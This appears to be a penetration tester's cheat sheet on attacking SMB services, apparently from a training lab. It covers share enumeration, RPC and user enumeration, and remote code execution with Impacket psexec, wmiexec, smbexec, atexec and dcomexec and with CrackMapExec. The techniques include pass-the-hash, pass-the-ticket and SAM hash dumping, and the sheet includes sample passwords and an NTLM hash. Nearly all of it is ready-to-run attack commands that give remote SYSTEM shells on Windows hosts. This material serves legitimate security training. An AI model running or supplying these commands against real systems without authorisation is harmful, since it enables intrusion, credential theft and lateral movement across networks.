## delete


# Interacting
## Show avaiable shares
```bash
# crackmapexec
$ crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'

# smbmap
$ smbmap -H 10.129.14.128
$ smbmap -H 10.129.14.128 -r notes
$ smbmap -H 10.129.14.128 --download "notes\note.txt"
$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"

# smbclient
$ smbclient -N -L //10.129.14.128
- `-N` suppresses the password prompt
- `-L` want to retrieve a list of available shares on the remote host
```


## Connecting
```bash
$ smbclient -U bob //10.129.42.253/users
$ smbclient -U user \\\\10.129.42.197\\SHARENAME

# PTH
$ smbclient.py -hashes":<hash>" <user>@<ip>
```

## Show Files
```bash
smb: \> ls \<SHARE>\

smb: \> recurse ON
smb: \> prompt OFF
smb: \> ls
```

## Download Files
```bash
smb: \> get prep-prod.txt 
```

# Footprinting
## Nmap
```bash
$ sudo nmap 10.129.14.128 -sV -sC -p139,445
$ nmap --script smb-os-discovery.nse -p445 10.10.10.40
```

## Remote Procedure Call (RPC)
```bash
$ rpcclient <IP> -U ""
$ rpcclient -U'%' <IP>
$ rpcclient -U "" -N 172.16.5.5
```

| Query              | Description                                                      |
|--------------------|------------------------------------------------------------------|
| srvinfo            | Server information.                                              |
| enumdomains        | Enumerate all domains that are deployed in the network.          |
| querydominfo       | Provides domain, server, and user information of deployed domains.|
| netshareenumall    | Enumerates all available shares.                                 |
| netsharegetinfo <share> | Provides information about a specific share.                   |
| enumdomusers       | Enumerates all domain users.                                     |
| queryuser <RID>    | Provides information about a specific user.                      |


## Impacket - Samrdump.py (Brute Forcing User RIDs)
```bash
$ samrdump.py 10.129.14.128
```

## Enum4Linux-ng
```bash
$ git clone https://github.com/cddmp/enum4linux-ng.git
$ cd enum4linux-ng
$ pip3 install -r requirements.txt
$ ./enum4linux-ng.py <IP> -A -C
```

# Remote Code Execution
- Impacket PsExec - Python PsExec like functionality example using RemComSvc.
- Impacket SMBExec - A similar approach to PsExec without using RemComSvc. The technique is described here. This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available.
- Impacket atexec - This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
- CrackMapExec - includes an implementation of smbexec and atexec.
- Metasploit PsExec - Ruby PsExec implementation.


```
$ impacket-psexec -h
$ impacket-psexec administrator:'Password123!'@10.10.110.17
```

```
$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

## interactive-shell
**Psexec.py [https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py]**
One of the most useful tools in the Impacket suite is psexec.py. Psexec.py is a clone of the Sysinternals psexec executable, but works slightly differently from the original. The tool creates a remote service by uploading a randomly-named executable to the ADMIN$ share on the target host. It then registers the service via RPC and the Windows Service Control Manager. Once established, communication happens over a named pipe, providing an interactive remote shell as SYSTEM on the victim host.

To connect to a host with psexec.py, we need credentials for a user with local administrator privileges.

```bash
# ClearText
$ impacket-psexec <domain>/<user>:<password>@<ip>
$ psexec.py <domain>/<user>:<password>@<ip>

# PTH
$ impacket-psexec -hashes ":<hash>"<user>@<ip>`
$ psexec.py -hashes ":<hash>"<user>@<ip>

# PTT - Same as PassTheHash but use -k and -no-pass 
$ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
$ psexec.py -dc-ip IP -target-ip $IP -no-pass -k <DOMAIN>/<USER>@<target machine name>.<DOMAIN> -> goat
$ psexec.py -dc-ip <IP> -no-pass -k <domain>/<user>@<ip>
```

### pseudo-shell (file write and read)
#### Impacket Toolkit
**Atexec.py [https://github.com/fortra/impacket/blob/master/examples/atexec.py]**
```bash
# ClearText
$ atexec.py <domain>/<user>:<password>@<ip> "command" 

# PTH
$ atexec.py -hashes ":<hash>" <domain>/<user>@<ip> "command"

# PTT
$ atexec.py <domain>/<user>@<ip> "command" -k -no-pass
```

**Smbexec.py [https://github.com/fortra/impacket/blob/master/examples/smbexec.py]**
```bash
# ClearText
$ smbexec.py <domain>/<user>:<password>@<ip>

# PTH
$ smbexec.py -hashes ":<hash>" <domain>/<user>@<ip> 

# PTT
$ smbexec.py <domain>/<user>@<ip> -k -no-pass
```

**Wmiexec.py [https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py]**
Wmiexec.py utilizes a semi-interactive shell where commands are executed through Windows Management Instrumentation. It does not drop any files or executables on the target host and generates fewer logs than other modules. After connecting, it runs as the local admin user we connected with (this can be less obvious to someone hunting for an intrusion than seeing SYSTEM executing many commands). This is a more stealthy approach to execution on hosts than other tools, but would still likely be caught by most modern anti-virus and EDR systems. We will use the same account as with psexec.py to access the host.
```bash
# ClearText
$ wmiexec.py <domain>/<user>:<password>@<ip>

# PTH
$ wmiexec.py -hashes":<hash>" <user>@<ip> 
```

**Dcomexec.py [https://github.com/fortra/impacket/blob/master/examples/dcomexec.py]**
```bash
# ClearText
$ dcomexec.py <domain>/<user>:<password>@<ip>

# PTH
$ dcomexec.py -hashes ":<hash>"<user>@<ip> 
```

**CrackMapExec**
```bash
# ClearText
$ crackmapexec smb <ip> -u <user> -p <pssword> -x <command> --exec-method smbexec
$ crackmapexec smb <ip_range> -u <user> -p < password> -d <domain>
$ crackmapexec smb <ip_range> -u <user> -p < password> -local-auth

# PTH
$ crackmapexec smb <ip_range> -u <user> -d <domain> -H ':<hash>' 
$ crackmapexec smb <ip_range> -u <user> -H ':<hash>' --local-auth
```

